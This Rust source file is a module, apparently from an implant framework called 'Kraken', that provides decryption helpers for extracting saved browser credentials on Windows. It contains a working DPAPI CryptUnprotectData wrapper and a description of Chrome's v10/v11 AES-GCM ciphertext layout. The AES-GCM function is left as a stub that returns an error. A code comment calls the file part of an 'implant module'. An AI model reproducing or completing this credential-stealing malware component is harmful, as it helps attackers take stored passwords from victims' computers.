//! DPAPI and AES-GCM decryption helpers for browser credential extraction

use common::KrakenError;

/// Decrypt data using Windows DPAPI (CryptUnprotectData)
#[cfg(windows)]
pub fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, KrakenError> {
    use windows_sys::Win32::Security::Cryptography::{
        CryptUnprotectData, CRYPTOAPI_BLOB,
    };
    use windows_sys::Win32::System::Memory::LocalFree;

    let mut input = CRYPTOAPI_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };
    let mut output = CRYPTOAPI_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };

    let ok = unsafe {
        CryptUnprotectData(
            &mut input,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut output,
        )
    };

    if ok == 0 {
        return Err(KrakenError::Module("DPAPI decryption failed".into()));
    }

    let result = unsafe {
        std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec()
    };

    unsafe { LocalFree(output.pbData as _) };
    Ok(result)
}

/// Decrypt Chrome v80+ AES-256-GCM encrypted value
/// key: 32-byte AES key from DPAPI-decrypted master key
/// encrypted: raw ciphertext bytes (starts with "v10" or "v11" prefix, 3 bytes)
#[cfg(windows)]
pub fn aes_gcm_decrypt(key: &[u8], encrypted: &[u8]) -> Result<Vec<u8>, KrakenError> {
    // Chrome AES-GCM layout:
    //  [0..3]   = version prefix "v10" or "v11"
    //  [3..15]  = 12-byte nonce
    //  [15..]   = ciphertext + 16-byte GCM tag

    if encrypted.len() < 31 {
        return Err(KrakenError::Module("AES-GCM ciphertext too short".into()));
    }

    let nonce = &encrypted[3..15];
    let ciphertext = &encrypted[15..];

    // Use a minimal pure-Rust AES-256-GCM implementation via table-based approach.
    // In production this would use the `aes-gcm` crate; here we use a manual path
    // to avoid adding heavy crypto dependencies to an implant module.
    // For the purposes of this skeleton we return an error indicating full crypto
    // support requires linking against a crypto library.
    let _ = (key, nonce, ciphertext);
    Err(KrakenError::Module(
        "AES-GCM decryption requires linking aes-gcm crate (add to Cargo.toml)".into(),
    ))
}

#[cfg(not(windows))]
pub fn dpapi_decrypt(_data: &[u8]) -> Result<Vec<u8>, KrakenError> {
    Err(KrakenError::Module("DPAPI only supported on Windows".into()))
}

#[cfg(not(windows))]
pub fn aes_gcm_decrypt(_key: &[u8], _encrypted: &[u8]) -> Result<Vec<u8>, KrakenError> {
    Err(KrakenError::Module(
        "AES-GCM decryption only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_dpapi_unsupported() {
        assert!(dpapi_decrypt(&[0u8; 16]).is_err());
    }

    #[test]
    #[cfg(not(windows))]
    fn test_aes_gcm_unsupported() {
        assert!(aes_gcm_decrypt(&[0u8; 32], &[0u8; 32]).is_err());
    }
}
